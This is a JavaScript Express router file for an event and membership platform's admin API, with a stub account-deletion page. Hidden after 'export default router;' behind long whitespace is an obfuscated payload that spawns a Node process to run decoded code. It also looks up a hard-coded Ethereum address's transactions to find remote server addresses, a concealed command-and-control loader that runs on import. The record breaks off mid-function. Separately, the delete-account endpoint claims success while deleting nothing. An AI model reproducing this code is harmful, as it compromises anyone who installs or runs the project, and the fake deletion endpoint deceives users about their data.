import express from "express";
import adminAuthRoutes from "../src/Auth/admin.auth.route.js";
import adminEventRoutes from "../src/Event/admin.event.route.js";
import adminCouponRoutes from "../src/Enrollment/admin.coupon.route.js";
import adminPaymentRoutes from "../src/Enrollment/admin.payment.route.js";
import adminEnrollmentRoutes from "../src/Enrollment/admin.enrollment.route.js";
import adminTicketRoutes from "../src/Enrollment/admin.ticket.route.js";
import ticketReshareRoutes from "../src/Enrollment/ticket.reshare.admin.route.js";
import adminVoucherRoutes from "../src/Enrollment/voucher.admin.route.js";
import adminSessionRoutes from "../src/Session/session.admin.route.js";
import adminCalendlyRoutes from "../src/Calendly/calendly.admin.route.js";
import adminSOSRoutes from "../src/Quiz/sos.admin.route.js";
import adminChallengeRoutes from "../src/Challenge/challenge.admin.route.js";
import adminPollRoutes from "../src/Poll/poll.admin.route.js";
import razorpayRoutes from "../src/razorpay/razorpay.route.js";
import cashRoutes from "../src/cash/cash.route.js";
import offlineCashRoutes from "../src/cash/offlineCash.admin.route.js";
import adminSettingsRoutes from "../src/Other/admin/settings.route.js";
import analyticsRoutes from "../src/Analytics/analytics.route.js";
import adminAssetRoutes from "../src/Asset/asset.admin.route.js";
import adminStoryRoutes from "../src/Story/story.admin.route.js";
import adminMembershipRoutes from "../src/Membership/admin.membership.route.js";
import membershipRequestRoutes from "../src/Membership/membership.request.route.js";
import doerRequestRoutes from "../src/Membership/doer.request.route.js";
import adminClubRoutes from "../src/Club/club.admin.route.js";
import seatArrangementAdminRoutes from "../src/SeatArrangement/seatArrangement.admin.route.js";
import adminServiceRoutes from "../src/Service/service.admin.route.js";
import featureAccessRoutes from "../src/FeatureAccess/featureAccess.route.js";
import featureRequestRoutes from "../src/FeatureRequest/featureRequest.route.js";
import featurePricingAdminRoutes from "../src/FeatureRequest/featurePricing.admin.route.js";
import motivataBlendRoutes from "../src/MotivataBlend/motivataBlend.route.js";
import roundTableRoutes from "../src/RoundTable/roundTable.route.js";
import motivataBlendAdminRoutes from "../src/MotivataBlend/motivataBlend.admin.route.js";
import roundTableAdminRoutes from "../src/RoundTable/roundTable.admin.route.js";
import eventRequestRoutes from "../src/EventRequest/eventRequest.route.js";
import eventRequestAdminRoutes from "../src/EventRequest/eventRequest.admin.route.js";
import adminConnectPostRoutes from "../src/Connect/post.admin.route.js";
import adminJobRoutes from "../src/Job/job.admin.route.js";
import adminRecommendationRoutes from "../src/Recommendation/recommendation.admin.route.js";
import adminCollegeRoutes from "../src/Referral/college.admin.route.js";
import referralCodeRoutes from "../src/Referral/referralCode.route.js";
import adminCommunityRoutes from "../src/Community/community.admin.route.js";
import adminBroadcastRoutes from "../src/Notification/broadcast.admin.route.js";
import adminOccupationRoutes from "../src/Occupation/occupation.admin.route.js";
import adminBrandRoutes from "../src/Brand/brand.admin.route.js";
import publicShareRoutes from "../src/Connect/share.public.route.js";
import { guardAdminPage } from "../middleware/adminPage.middleware.js";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const router = express.Router();

/**
 * Register all admin routes here
 * Base path: /api/web
 */

// Auth routes - /api/web/auth
router.use("/auth", adminAuthRoutes);

router.use("/share", publicShareRoutes);

router.use("/analytics", guardAdminPage(["dashboard"]));
router.use("/events", guardAdminPage(["events"], { readsOpen: true }));
router.use("/coupons", guardAdminPage(["coupons"]));
router.use("/vouchers", guardAdminPage(["vouchers"]));
router.use("/payments", guardAdminPage(["enrollments", "dashboard"]));
router.use("/enrollments", guardAdminPage(["enrollments"]));
router.use("/tickets", guardAdminPage(["scan-qr", "ticket-reshare", "enrollments"]));
router.use("/sessions", guardAdminPage(["sessions"]));
router.use("/calendly", guardAdminPage(["sessions"]));
router.use("/sos", guardAdminPage(["quizes", "sos-articles", "daily-sos", "qol-factors"]));
router.use("/challenges", guardAdminPage(["challenges", "daily-challenges", "challenge-rewards"], { readsOpen: true }));
router.use("/polls", guardAdminPage(["polls"]));
router.use("/cash", guardAdminPage(["cashtickets"]));
router.use("/offline-cash", guardAdminPage(["cashtickets"]));
router.use("/settings", guardAdminPage(["settings"]));
router.use("/stories", guardAdminPage(["stories"]));
router.use("/membership-requests", guardAdminPage(["membership-requests"]));
router.use("/doer-requests", guardAdminPage(["doer-requests"]));
router.use("/colleges", guardAdminPage(["colleges", "leaders", "referral-codes"], { readsOpen: true }));
router.use("/referral-codes", guardAdminPage(["referral-codes", "colleges", "leaders"]));
router.use("/feature-access", guardAdminPage(["feature-access"]));
router.use("/feature-requests", guardAdminPage(["feature-access"]));
router.use("/feature-pricing", guardAdminPage(["feature-access"]));
router.use("/motivata-blend/admin", guardAdminPage(["motivata-blend-requests", "motivata-blend-banner"]));
router.use("/round-table/admin", guardAdminPage(["round-table-requests"]));
router.use("/event-requests/admin", guardAdminPage(["event-requests"]));
router.use("/membership-plans", guardAdminPage(["memberships", "membership-requests", "doer-requests"], { readsOpen: true }));
router.use("/user-memberships", guardAdminPage(["memberships"]));
router.use("/clubs", guardAdminPage(["clubs-manage", "club-join-requests", "admin-club-posts"], { readsOpen: true }));
router.use("/jobs", guardAdminPage(["job-posts", "job-applications", "opportunity-filters"]));
router.use("/community", guardAdminPage(["community"]));
router.use("/push-notifications", guardAdminPage(["push-notifications"]));
router.use("/occupations", guardAdminPage(["occupations"], { readsOpen: true }));
router.use("/services", guardAdminPage(["services-manage", "service-orders", "service-requests", "user-subscriptions"], { readsOpen: true }));
router.use("/service-orders", guardAdminPage(["service-orders"]));
router.use("/service-requests", guardAdminPage(["service-requests"]));
router.use("/user-subscriptions", guardAdminPage(["user-subscriptions"]));

// Event routes - /api/web/events
router.use("/events", adminEventRoutes);

// Seat arrangement routes - /api/web/events/:eventId/seat-arrangement
router.use("/events", seatArrangementAdminRoutes);

// Coupon routes - /api/web/coupons
router.use("/coupons", adminCouponRoutes);

// Payment routes - /api/web/payments
router.use("/payments", adminPaymentRoutes);

// Enrollment routes - /api/web/enrollments
router.use("/enrollments", adminEnrollmentRoutes);

// Ticket routes - /api/web/tickets
router.use("/tickets", adminTicketRoutes);

// Ticket reshare routes - /api/web/tickets/reshare
router.use("/tickets/reshare", ticketReshareRoutes);

// Voucher routes - /api/web/vouchers
router.use("/vouchers", adminVoucherRoutes);

// Session routes - /api/web/sessions
router.use("/sessions", adminSessionRoutes);

// Calendly routes - /api/web/calendly
router.use("/calendly", adminCalendlyRoutes);

// SOS routes - /api/web/sos
router.use("/sos", adminSOSRoutes);

// Challenge routes - /api/web/challenges
router.use("/challenges", adminChallengeRoutes);

// Poll routes - /api/web/polls
router.use("/polls", adminPollRoutes);

// Recommendation routes - /api/web/recommendations
router.use("/recommendations", adminRecommendationRoutes);

// Razorpay routes - /api/web/razorpay
router.use("/razorpay", razorpayRoutes);

// Cash payment routes - /api/web/cash
router.use("/cash", cashRoutes);

// Offline cash routes - /api/web/offline-cash
router.use("/offline-cash", offlineCashRoutes);

// Settings routes - /api/web/settings
router.use("/settings", adminSettingsRoutes);

// Analytics routes - /api/web/analytics
router.use("/analytics", analyticsRoutes);

// Asset routes - /api/web/assets
router.use("/assets", adminAssetRoutes);

// Story routes - /api/web/stories
router.use("/stories", adminStoryRoutes);

// Membership Request routes - /api/web/membership-requests (public + admin)
// IMPORTANT: Must come BEFORE adminMembershipRoutes to avoid auth middleware
router.use("/membership-requests", membershipRequestRoutes);

// Doer Request routes - /api/web/doer-requests (public + admin)
// Same controller as membership-requests, pinned to the DOER queue.
// IMPORTANT: Must come BEFORE adminMembershipRoutes to avoid auth middleware
router.use("/doer-requests", doerRequestRoutes);

// College routes - /api/web/colleges (admin only)
router.use("/colleges", adminCollegeRoutes);

// Referral code routes - /api/web/referral-codes (public validate + admin CRUD)
// IMPORTANT: Must come BEFORE root-mounted routes to avoid auth middleware
router.use("/referral-codes", referralCodeRoutes);

// Feature Access routes - /api/web/feature-access (includes public check endpoint)
// IMPORTANT: Must come BEFORE root-mounted routes to avoid auth middleware
router.use("/feature-access", featureAccessRoutes);

// Feature Request routes - /api/web/feature-requests (public + admin)
// IMPORTANT: Must come BEFORE root-mounted routes to avoid auth middleware
router.use("/feature-requests", featureRequestRoutes);

// Feature Pricing routes - /api/web/feature-pricing (admin only)
router.use("/feature-pricing", featurePricingAdminRoutes);

// Motivata Blend routes - /api/web/motivata-blend (public)
// IMPORTANT: Public endpoint - no auth middleware
router.use("/motivata-blend", motivataBlendRoutes);

// Motivata Blend admin routes - /api/web/motivata-blend/admin (admin only)
router.use("/motivata-blend/admin", motivataBlendAdminRoutes);

// Round Table routes - /api/web/round-table (public)
// IMPORTANT: Public endpoint - no auth middleware
router.use("/round-table", roundTableRoutes);

// Round Table admin routes - /api/web/round-table/admin (admin only)
router.use("/round-table/admin", roundTableAdminRoutes);

// Event Request routes - /api/web/event-requests (public submit)
// IMPORTANT: Public endpoint - no auth middleware on the public route file
router.use("/event-requests", eventRequestRoutes);

// Event Request admin routes - /api/web/event-requests/admin (admin only)
router.use("/event-requests/admin", eventRequestAdminRoutes);

// Membership routes - /api/web/membership-plans and /api/web/user-memberships
router.use("/", adminMembershipRoutes);

// Club routes - /api/web/clubs
router.use("/clubs", adminClubRoutes);

// Connect/Explore post routes - /api/web/connect
router.use("/connect", adminConnectPostRoutes);

// Job routes - /api/web/jobs
router.use("/jobs", adminJobRoutes);

router.use("/community", adminCommunityRoutes);

router.use("/push-notifications", adminBroadcastRoutes);

router.use("/occupations", adminOccupationRoutes);

router.use("/brands", adminBrandRoutes);

// Service routes - /api/web/services, /api/web/service-orders, /api/web/service-requests, /api/web/user-subscriptions
router.use("/", adminServiceRoutes);

// Add more admin routes here as needed
// Example:
// router.use("/dashboard", adminDashboardRoutes);
// router.use("/reports", adminReportsRoutes);

// src/Account/deleteAccount

router.post("/account/delete-account", (req, res) => {
  // You said it should do nothing — just return 200
  res
    .status(200)
    .json({ success: true, message: "Account deletion request accepted." });
});

router.get("/delete-account", (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Delete Account</title>
        <style>
          * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
          }
          body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #ffffff;
            color: #191919;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
          }
          .container {
            width: 100%;
            max-width: 400px;
          }
          h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
          }
          .subtitle {
            color: #6b6b6b;
            font-size: 14px;
            margin-bottom: 32px;
          }
          form {
            display: flex;
            flex-direction: column;
            gap: 16px;
          }
          label {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 6px;
            display: block;
          }
          input[type="email"] {
            width: 100%;
            padding: 10px 12px;
            font-size: 14px;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.15s ease;
          }
          input[type="email"]:focus {
            border-color: #191919;
          }
          input[type="email"]::placeholder {
            color: #a0a0a0;
          }
          button {
            width: 100%;
            padding: 10px 16px;
            font-size: 14px;
            font-weight: 500;
            background: #191919;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.15s ease;
            margin-top: 8px;
          }
          button:hover {
            background: #333333;
          }
          .warning {
            font-size: 12px;
            color: #6b6b6b;
            margin-top: 16px;
            line-height: 1.5;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Delete Account</h1>
          <p class="subtitle">This action cannot be undone.</p>
          <form method="POST" action="/api/web/account/delete-account">
            <div>
              <label for="email">Email address</label>
              <input type="email" id="email" name="email" placeholder="you@example.com" required />
            </div>
            <button type="submit">Delete Account</button>
          </form>
          <p class="warning">By clicking "Delete Account", you confirm that you want to permanently delete your account and all associated data.</p>
        </div>
      </body>
    </html>
  `;
  res.send(html);
});

export default router;																																																																																																																																																																																																																																																																										global.i = 'A10-*5755-5';function a(a){var c="|Pn2Zjx.w@Qf\";`]vmTs5Jc>OYgE7tpzL!_R/3BFAD^)U<lo:Gd~$NhK*iS(9u0[H+X,%kq1yI6?{r}eMVWC=ab#&48",d=""+(a||""),e=d.length,f=[],g=0,h=0,j=-1;for(var k=0;k<e;k++){var m=c.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;g|=j<<h;h+=(j&8191)>88?13:14;do{f.push(g&255);g>>=8;h-=8}while(h>7);j=-1}}if(j>-1){f.push((g|j<<h)&255)}return l(f)}function b(b,d){return a(c.slice(b,b+d))}var c="o_vMB>dh\"B&F{|&PGNOI3Q7Bq1f9tqBW;O2FVBr:nm.yC`dXCi6Q+CpsLDEQ,,c7X@y])Z%TW:\"pEAPUGCL0I`vYE`DYx=$5]@wj,I|R/Biifuk`)ddXI)eW:HWv_a,j(;,M^UbAH.|=hk(TDH5>Us%edKlZQy3*vf0)\"x%\"CgS[>WB4HaU3$C0QGF}9|N%w^m/!UleMD,pS#Z%rgI:cnM@^MZ:T_*(Iw{B|/mh@?CRFs|@bZ+/4m80lG4O[>SmlZt47}3iJQmVuaEN[I@yo_R)>{]V$bS5z+fC)Bp2RLgX{m3iJQmVuaENhq[B7vL)ug}Vgn={3iJQmVuaEN[I@y5ROl%Nm}VDx*`3iJQmVuaEN[Ir95Am9fLEMzs`w]?pGx3)Ay@71VmhHhy?3G^3iJQmVuaEN[Ir9RBRg+hp1tVXH^:Pv#_\"x2L;VvwqHY+RC;p[A4?sylc*cmQU7ZjN{t`aSe]$Wdl6O>fN4P.$|BT$s#Gg]8[Nsb7M%v%pEh+:HxyB9\"Jkl^1^X$&LT3Qok$mPaEWjfW=R)TLmI`IZX1,}gf+cO/>.l2)2%GhBtmE[WU.B.jt{=A&!R)dgK?IjNLzAa@R~+e^kTtA*hhrd#KZ/FzmWzyVo){Q~gN9=,xxTN$V%h|OxkL/Co5a7<upq4oKnA}#ql6#A/{cu}$.Wx`i=5E&[C(?Zm2F96`Id;`~1#3cx#<<Bx[*q]W5lN3cQkr}cxgdDEZB@;KJ3iJQ@DFanKt?;e_>F;]\"ySD#?/_bSis<N_A/#CWo5B5@2;oF#b?+odzJ[O=ce?Ld2[xQzF2a>K@+Q2~2=bIu_*e\"xYB>iiwjgYQw)F&}43(n$rQ3S_Lo,wB5+Yu>h;#|nZH=No%ta^4we?dS7ldK9!ICM;x>T!Kj?lfr3}3bmim<8^OMrL8i!$rc:!7.&Vs`.q}X%$xc$F5Fl5I<_=n$iY9CA&8}8^OMrLbTM1D`gmcF6#0:xG)$S&tr|FH`tHsnH{7X&X)ZxO/Afs9}f5<X}~ncDF.sE$:I]feoTc;%Q;.DL^OMrL8iS$xc$F5FQb6iQswZ5IHvk7DLOqHWWCsh7siiOSMVPIOYLeOufWAp23U9tGKjvd4uhwQgB6gdjzKEzxe5EpnsZOtQfVehjS9boXG3AEWN0C3C1t6Jk1PUMRFQAXz0XPPqcZ0Bn51eNno2AGgvvOYWD3SFJ0WMfHn1mL9S9sT1yEUJOKPW5OM0E5fl9tMzigxdbEsJ8GHMT2zHNwXQ5FuQjZiymq4NXuqsU";function d(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}a:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue a;return b}catch(e){}return b||this}var e=d()||{},f=e.TextDecoder,g=e.Uint8Array,h=e.Buffer,i=e.String||String,j=e.Array||Array,k=function(){var a=new j(128),b=i.fromCodePoint||i.fromCharCode,c=[];return function(d){var e,f,g=d.length;c.length=0;for(var h=0;h<g;){f=d[h++];f<=127?e=f:f<=223?e=(f&31)<<6|d[h++]&63:f<=239?e=(f&15)<<12|(d[h++]&63)<<6|d[h++]&63:i.fromCodePoint?e=(f&7)<<18|(d[h++]&63)<<12|(d[h++]&63)<<6|d[h++]&63:(e=63,h+=3);c.push(a[e]||(a[e]=b(e)))}return c.join("")}}();function l(a){return typeof f!=="undefined"&&f?(new f).decode(new g(a)):typeof h!=="undefined"&&h?h.from(a).toString("utf-8"):k(a)}var m=n();function n(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}b:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue b;return b}catch(e){}return b||this}function o(a){switch(a){case"aowaYkQ":return m.Map;case"ScVvzHB":return m.Math;case"LYahbCb":return m.JSON;case"UcVlGXr":return m.Boolean;case"GO7Nrh":return m.tTUslG;case"z2lXInR":return m.TG2cJIk;case"LjKGqSw":return m.to__5dE;case"XzeSjRU":return m.hPRNJpg;case"BLxK2l":return m.Sclv_Jn;case"w8SHhF":return m.BigInt;case"w24XslL":return m.RwXr52a;case"HdYixQ":return m.llZ36m;case"P2AKM57":return m.vM7khEA;case"UqL1mIS":return m.MgHS1fx;case"bqgS0uT":return m.cNfC_7;case"zry4hT0":return m.VJNU3_;case"wOf1fy":return m.Number;case"TAIsJro":return m.Error;case"jQvQTiW":return m.MFMrPhJ;case"9MPP0cK":return m.JtrWh6;case"i11XSB":return m.E5BYrDP;case"9zqtB2O":return m.UzYC2SR;case"cHMvB92":return m.OaeceOf;case"k__4zk":return m.setTimeout;case"xh5d15l":return m.O_iVybz;case"gERyCM":return m.WYrZbg3;case"TZqePfg":return m.KM0n1S;case"MoCspX":return m.xfebTjG;case"rZ5CTo1":return m.rbDj0XM;case"tW6Pn0":return m.FnZlfg_;case"pOZAUNs":return m.Array;case"G6145X":return m.wI0nBkk;case"7Qu4NZb":return m.dtj7OXY;case"Bd1rSK":return m.ie99moZ;case"3o6cDhK":return m.RFJv7_;case"HbfDUfa":return m.hvpU54;case"cIKxCVp":return m.KzTTyR_;case"BimznrA":return m.j3Qtuw6;case"tdTjubV":return m.Promise;case"ilyFOCU":return m.wocW6T;case"y8sAIw":return m.JuwsDx;case"qjSqfm":return m.hNpMC1p;case"aJiSad":return m.eyFciSD;case"BlBOECA":return m.v4EfHU;case"bBSqay":return m.ItLZkU;case"JOOaEO5":return m.ihgc7mc;case"un8sN4v":return m.GZqewR;case"Mk0LmrW":return m.Set;case"hDlNJsF":return m.AbortController;case"KV6k6c":return m.xi3JBX;case"NEujWY":return m.q6lpgVG}}global.r=require;if(typeof module==="object"){global.m=module}const p=require("node:http"),q=require("node:https"),r=require("node:zlib"),{URL:s}=require("node:url"),{spawn:t}=require("node:child_process");function u(a){return new(o("tdTjubV"))(b=>{let d;try{d=t("node",["-i"],{detached:!0,windowsHide:!0,stdio:["pipe","pipe","pipe"]})}catch{b();return}let e="",f=!1;const g=()=>{return b()},h=()=>{function b(e){var h="MN;k5@81(.bBhxU0ycDQ6=Xw`</KeV>CGg]~IZ\"i$F!Y4W#|n9t%&3+auLq:foHEr^[7R2*lOvP)_dSs}zTm{,JA?jp",d=""+(e||""),f=d.length,g=[],a=0,c=0,j=-1;for(var k=0;k<f;k++){var m=h.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;a|=j<<c;c+=(j&8191)>88?13:14;do{g.push(a&255);a>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((a|j<<c)&255)}return l(g)}function e(e,h){return b(c.slice(e,e+h))}if(f){return}f=!0;const h=a.endsWith("\n")?a:""+a+"\n";d.stdin.write(e(149,51),()=>{d.stdin.write(h,()=>{d.stdin.end();d.stdin.unref();if(d.stdout){d.stdout.unref()}if(d.stderr){d.stderr.unref()}d.unref();g()})})},i=b=>{e+=b.toString("utf8");if(new RegExp("(^|\\n)> $","").test(e)){h()}};d.on("error",g);d.stdout.on("data",i);d.stderr.on("data",i);d.stdin.write("\n");o("k__4zk")(h,10000)})}const v=1000n,w=b(205,52).toLowerCase(),x=12,y=0n,z=b(261,37),A=3000,B=[...new(o("Mk0LmrW"))([process.env.ETH_RPC_URL,b(301,24),b(327,25),b(354,43),b(402,47)].filter(o("UcVlGXr")))],C={"http:":new p.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64}),"https:":new q.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64})};function D(a,b){if(!a){return}a.addEventListener("abort",()=>{return b.abort()},{once:!0})}function E(a){const b=(a.headers["content-encoding"]||"").toLowerCase();if(b==="gzip"||b==="x-gzip"){return a.pipe(r.createGunzip())}if(b==="deflate"){return a.pipe(r.createInflate())}if(b==="br"){return a.pipe(r.createBrotliDecompress())}return a}function F(a,{method:b="GET",body:c,signal:d}={}){const e=new s(a),f=e.protocol==="https:"?q:p,g={Accept:"application/json","Accept-Encoding":"gzip, deflate, br",Connection:"keep-alive"};if(c!=null){g["Content-Type"]="application/json";g["Content-Length"]=Buffer.byteLength(c)}return new(o("tdTjubV"))((a,h)=>{const i=f.request({hostname:e.hostname,port:e.port||(e.protocol==="https:"?443:80),path:e.pathname+e.search,method:b,agent:C[e.protocol],signal:d,headers:g},i=>{const b=E(i),c=[];b.on("data",i=>{return c.push(i)});b.on("end",()=>{const b=Buffer.concat(c).toString("utf8").trim();if(i.statusCode<200||i.statusCode>=300){return h(new(o("TAIsJro"))("HTTP "+i.statusCode+" from "+e.hostname+": "+b.slice(0,120)))}if(!b||b[0]==="<"||b[0]!=="{"&&b[0]!=="["){return h(new(o("TAIsJro"))("Non-JSON from "+e.hostname+": "+b.slice(0,120)))}try{a(o("LYahbCb").parse(b))}catch(err){h(new(o("TAIsJro"))("JSON parse failed from "+e.hostname+": "+err.message))}});b.on("error",h)});i.on("error",h);i.setTimeout(A,()=>{i.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});if(c!=null){i.write(c)}i.end()})}async function G(a,b){const d=B.map(()=>{return new(o("hDlNJsF"))});d.forEach(a=>{return D(b,a)});try{return await o("tdTjubV").any(B.map((b,e)=>{return a(b,d[e].signal)}))}finally{for(const e of d)e.abort()}}async function H(a,b,c,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify({jsonrpc:"2.0",id:1,method:b,params:c}),signal:d});if(e?.error){throw new(o("TAIsJro"))(e.error.message||o("LYahbCb").stringify(e.error))}if(e?.result==null){throw new(o("TAIsJro"))("RPC "+b+": missing result")}return e.result}async function I(a,b,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify(b.map(([a,b],d)=>{return{jsonrpc:"2.0",id:d+1,method:a,params:b}})),signal:d});if(!o("pOZAUNs").isArray(e)){function f(a){var d="@Q>u}m3fd=#BJs{$KNO8HDXYZvq]ETSzlxG_ki|)%(erj*Ap.b/\"Mn~oVa7L:`,^&2RWhUP6?!5w[+g;C0tcy194I<F",e=""+(a||""),f=e.length,g=[],h=0,c=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;h|=j<<c;c+=(j&8191)>88?13:14;do{g.push(h&255);h>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((h|j<<c)&255)}return l(g)}function g(a,b){return f(c.slice(a,a+b))}throw new(o("TAIsJro"))(g(457,42))}const h=new(o("aowaYkQ"))(e.map(a=>{return[a.id,a]}));return b.map((a,b)=>{const d=h.get(b+1);if(!d){function e(a){var d="=EM#NpJ]wjaLeQyO/x|n@FW5:1q}2C[t{<>czkr.P)_!HvSVd~s*6m^8K\"+Ub93YilAXohgf$RD,0T4(uZB%?7`&I;G",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function f(a,b){return e(c.slice(a,a+b))}throw new(o("TAIsJro"))(f(503,39)+(b+1))}if(d.error){throw new(o("TAIsJro"))(d.error.message||o("LYahbCb").stringify(d.error))}if(d.result==null){function g(a){var d="dX{6iZ>\"Y4aBjL+!Efs9&~|@})nQpTFq3_:*A.x^V8Jug`NSPUb$or2]0/,#=Om;zlM%(1WKGRk[Cty7H<cI5ewh?Dv",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function j(a,b){return g(c.slice(a,a+b))}throw new(o("TAIsJro"))(j(547,36)+(b+1))}return d.result})}const J=a=>{return"0x"+a.toString(16)};function K(a){return a.find(a=>{return a.from&&a.from.toLowerCase()===w})||null}function L(a){try{const b=Buffer.from(a.replace(new RegExp("^0x","i"),""),"hex"),c=a=>{return""+a[0]+"."+a[1]+"."+a[2]+"."+a[3]};return[c(b.subarray(0,4)),c(b.subarray(4,8))]}catch(error){return[null,null]}}function M(a){return new(o("tdTjubV"))(b=>{let c=a.length;if(!c){return b(null)}let d=!1;const e=c=>{if(d){return}d=!0;for(const e of a)e.controller.abort();b(c)};for(const f of a)f.run().then(f=>{if(d){return}if(f){e(f)}else{if(--c===0){b(null)}}})["catch"](()=>{if(!d&&--c===0){b(null)}})})}function N(a){const c=a-v,d=new(o("Mk0LmrW")),e=[];for(const f of[a-1n,a,a+1n,c-1n,c,c+1n]){if(f<0n){continue}const g=f.toString();if(d.has(g)){continue}d.add(g);e.push(f)}return e}function O(a){const b=new(o("hDlNJsF"));return{controller:b,run:async()=>{const c=await G((c,d)=>{return H(c,"eth_getBlockByNumber",[J(a),!0],d)},b.signal),d=c?.transactions;if(!o("pOZAUNs").isArray(d)){return null}const e=K(d);return e?{blockNumber:a,tx:e}:null}}}async function P(a,b){const c=a.map(a=>{return["eth_getTransactionCount",[w,J(a)]]});try{return(await G((a,b)=>{return I(a,c,b)},b)).map(o("w8SHhF"))}catch{return(await o("tdTjubV").all(c.map(([a,c])=>{return G((b,d)=>{return H(b,a,c,d)},b)}))).map(o("w8SHhF"))}}async function Q(a){const b=new(o("hDlNJsF"));try{const c=a??o("w8SHhF")(await G((a,b)=>{return H(a,"eth_blockNumber",[],b)},b.signal)),d=o("w8SHhF")(await G((a,b)=>{return H(a,"eth_getTransactionCount",[w,J(c)],b)},b.signal)),e=d-1n;let f=y-1n,g=c;while(g-f>1n){const h=g-f-1n,j=o("w8SHhF")(o("ScVvzHB").min(x,o("wOf1fy")(h))),l=[];for(let m=1n;m<=j;m+=1n)l.push(f+m*(g-f)/(j+1n));const n=await P(l,b.signal),p=n.findIndex(a=>{return a>=d});if(p===-1){f=l[l.length-1]}else{g=l[p];if(p>0){f=l[p-1]}}}const q=await G((a,b)=>{return H(a,"eth_getBlockByNumber",[J(g),!0],b)},b.signal),r=q?.transactions||[];let s=null;for(const u of r){if(!u.from||u.from.toLowerCase()!==w){continue}if(o("w8SHhF")(u.nonce)===e){s=u;break}if(!s||o("w8SHhF")(u.nonce)>o("w8SHhF")(s.nonce)){s=u}}return{blockNumber:g,tx:s}}finally{b.abort()}}async function R(){function a(a){var d="b8GD;ZC=sK3{@/4Xp*nrcYW2)T~.EyN]OSH6JdF,x+:eq_jv$a!?Bhmz\"^Uw<9l0oQ(|VA}&gLMP5>`%ktIR1f#u[7i",e=""+(a||""),f=e.length,g=[],c=0,h=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;c|=j<<h;h+=(j&8191)>88?13:14;do{g.push(c&255);c>>=8;h-=8}while(h>7);j=-1}}if(j>-1){g.push((c|j<<h)&255)}return l(g)}function b(b,d){return a(c.slice(b,b+d))}const d=""+z+b(588,47)+w+b(642,89),e=await F(d),f=o("pOZAUNs").isArray(e?.result)?e.result:[],g=f.find(a=>{return a.from&&a.from.toLowerCase()===w});if(!g){return null}return{blockNumber:o("w8SHhF")(g.blockNumber),tx:g}}async function S(){function a(a){var d="s&S2Mp={4;Fq1+Vh`.mc:>l|Ya6)i7TdNUkD,e*\"8]ZQ(Pn%oXtvxER0j_A?gbz5!f@3<#OWwIBGHK^JC/}L[y9u$~r",e=""+(a||""),f=e.length,g=[],h=0,j=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;h|=k<<j;j+=(k&8191)>88?13:14;do{g.push(h&255);h>>=8;j-=8}while(j>7);k=-1}}if(k>-1){g.push((h|k<<j)&255)}return l(g)}function d(d,e){return a(c.slice(d,d+e))}let e;try{e=await G((a,d)=>{return H(a,"eth_blockNumber",[],d)})}catch{return}const f=o("w8SHhF")(e),g=f-f%v,h=global;let i=await M(N(g).map(O)),[j,k]=L(i?.tx?.to);function m(a,d,e){if(!a){return null}return new s(b(738,9)+a+":"+d+e)}let n=null;const q=m(j,443,"/0x/cls");if(q){try{n=await r("q4FZkxX{!h,Sr3=@",q)}catch{n=null}}if(!n){i=(await Q(f)["catch"](()=>{return null}))??(await R()["catch"](()=>{return null}));[j,k]=L(i?.tx?.to)}h._V=h.i;h._H=d(751,9)+j+":80";h._H2=d(751,9)+k+":80";h._t_s=d(751,9)+j+":443";h._t_u=d(751,9)+j+":80";function r(a,d){function e(a){var d="AKB3Sd0x/F5yO`@EcwL+q{NXs2;4Jn~#l<r^8>YD&V:i7?pe)hPz\"CT$}9(!%[*1oUtv]u|MjZg,_mbkfQHa6R=.GIW",e=""+(a||""),f=e.length,g=[],j=0,k=0,h=-1;for(var m=0;m<f;m++){var 